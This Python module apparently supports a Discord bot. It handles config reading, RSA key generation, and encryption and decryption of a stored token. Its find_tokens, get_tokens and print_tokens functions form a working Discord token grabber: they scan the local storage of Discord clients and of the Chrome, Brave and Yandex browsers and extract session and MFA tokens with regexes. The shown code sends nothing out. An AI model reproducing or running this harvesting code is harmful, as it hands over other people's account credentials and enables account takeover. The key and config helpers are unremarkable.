from Crypto.Cipher import AES, PKCS1_OAEP
from configurator.config_parser import *
from Crypto.PublicKey import RSA
import configparser
import json
import os
import re


# initializing a ConfigParser
config = configparser.ConfigParser()
# reading the config file
config.read('configs/_.cfg')

# getting the token_path and privatekey_path from the data
token_path = config.get('PATHS', 'token_path')
priv_path = config.get('PATHS', 'private_path')
pub_path = config.get('PATHS', 'public_path')

# defining a function to find tokens with a path variable
def find_tokens(path):
    # concatenating the path string with '\\Local Storage\\leveldb'
    path += '\\Local Storage\\leveldb'
    # creating an empty tokens list
    tokens = []

    # searching for files in the path
    for file_name in os.listdir(path):
        # if the path does not end with .log and .ldb continue
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        # grab all tokens from file
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    # append token to the tokens list
                    tokens.append(token)
    # return tokens list
    return tokens

# defining a get tokens function
def get_tokens():
    # creating a variable local and roaming with the logged user's path
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    # creating a paths dictionary with different discord clients
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    # creating an empty message list
    message = []

    for platform, path in paths.items():
        # checking if path exists
        if not os.path.exists(path):
            continue

        # getting tokens
        tokens = find_tokens(path)

        # checking if the returned list has more than 1 item
        if len(tokens) > 0:
            for token in tokens:
                # appending platform + token in message
                message.append(f'{platform} : ' + token)

    # returning message
    return message

# deffining a print_tokens function
def print_tokens():
    # getting tokens
    tokens = get_tokens()
    # creating an empty t list
    t = []
    # checking if there are more than 1 tokens
    if len(tokens) > 1:
        for idx, tks in enumerate(tokens):
            # enumerating the tokens and appending the idx to each
            t.append(str(str(idx) + '. ' + tks))
    # returning t
    return t

# defining a generate_key function with a public_path and private_path
def generate_key(pubpath, privpath):
    # generating rsa key of 2048 bits
    key = RSA.generate(2048)
    # creating a pub variable and exporting the public key to it
    pub = key.publickey().export_key()
    # creating a priv variable and exporting the private key to it
    priv = key.export_key()
    # saving the public key to the pubpath variable
    with open(pubpath, "wb") as f:
        f.write(pub)
        f.close()
    # saving the private key to the privpath variable
    with open(privpath, "wb") as f:
        f.write(priv)
        f.close()

# defining an encrypt function with message and path
def encrypt(message, path):
    # opening the public key file 
    pub = RSA.import_key(open(path).read())
    rsa_enc = PKCS1_OAEP.new(pub)
    # encoding message in utf-8
    message = message.encode("utf-8")
    # encrypting message
    encrypted = rsa_enc.encrypt(message)
    # returning encrypted message
    return encrypted

# defining a decrypt function with message and path
def decrypt(message, path):
    # opening private key file
    priv = RSA.import_key(open(path).read())
    rsa_enc = PKCS1_OAEP.new(priv)
    # decrypting message
    decrypted = rsa_enc.decrypt(message)
    # decoding message
    decrypted = decrypted.decode()
    # returning decrypted message
    return decrypted

# defining a get_token function
def get_token():
    # opening token file from the token_path variable with the read-bytes mode (rb)
    with open(token_path, 'rb') as f:
        # reading the file and setting it to a token variable
        token = f.read()
    # decrypting the encrypted token
    token = decrypt(token, priv_path)
    # returning the token
    return token

# defining a get_channel function
def get_channel():
    # getting the channel and setting it as a variable
    channel = get_value("OPTIONS", 'channel')
    # returning channel
    return channel